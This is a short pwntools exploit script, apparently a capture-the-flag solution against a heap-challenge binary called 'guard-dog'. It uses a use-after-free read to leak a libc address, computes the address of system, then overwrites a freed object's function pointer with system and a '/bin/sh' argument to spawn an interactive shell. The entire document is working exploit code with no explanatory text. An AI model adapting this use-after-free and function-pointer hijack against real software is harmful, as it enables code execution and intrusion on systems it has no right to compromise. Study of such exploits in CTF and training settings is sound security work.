from pwn import *

context.log_level = 'info'
context.arch = 'amd64'

libc = ELF('./libc-2.31.so', checksec=False)
UNSORTED_LEAK_OFFSET = 0x1ecbe0
SYSTEM_OFFSET = libc.symbols['system']

p = process(['./guard-dog'])


def menu(c):
    p.sendlineafter(b'> ', str(c).encode())


def adopt(kennel, name):
    name = name.ljust(24, b'\x00')[:24]
    menu(1)
    p.sendlineafter(b'(0-7): ', str(kennel).encode())
    p.sendafter(b'name: ', name)


def command(kennel):
    menu(2)
    p.sendlineafter(b'kennel: ', str(kennel).encode())


def release(kennel):
    menu(3)
    p.sendlineafter(b'kennel: ', str(kennel).encode())


def file_note(slot, size, content):
    content = content.ljust(size, b'\x00')[:size]
    menu(4)
    p.sendlineafter(b'(0-7): ', str(slot).encode())
    p.sendlineafter(b'size: ', str(size).encode())
    p.sendafter(b'contents: ', content)


def read_note(slot, size):
    menu(5)
    p.sendlineafter(b'note slot: ', str(slot).encode())
    p.recvuntil(b'contents: ')
    return p.recvn(size)


def shred_note(slot):
    menu(6)
    p.sendlineafter(b'note slot: ', str(slot).encode())


file_note(0, 1200, b'A' * 1200)   
file_note(1, 32, b'B' * 32)     
shred_note(0)
leak = u64(read_note(0, 16)[:8])

libc_base = leak - UNSORTED_LEAK_OFFSET
system_addr = libc_base + SYSTEM_OFFSET
adopt(0, b'rex')
release(0)
payload = b'/bin/sh\x00' + b'A' * 16 + p64(system_addr)
file_note(2, 32, payload)
command(0)

p.interactive()
